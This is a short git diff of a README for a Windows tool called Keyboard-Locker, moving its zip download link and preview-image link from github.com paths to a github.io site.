@@ -1,8 +1,8 @@
 # Keyboard-Locker
 
-[Download zip file here](https://github.com/limanson/Keyboard-Locker.io/Resources/Keyboard-Locker-Launcher.zip)
+[Download zip file here](https://limanson.github.io/Keyboard-Locker/Resources/Keyboard-Locker-Launcher.zip)
 
-![](https://github.com/limanson/Keyboard-Locker.io/Resources/Preview-Image.jpg)
+![](https://limanson.github.io/Keyboard-Locker/Resources/Preview-Image.jpg)
 
 Run on Windows
 
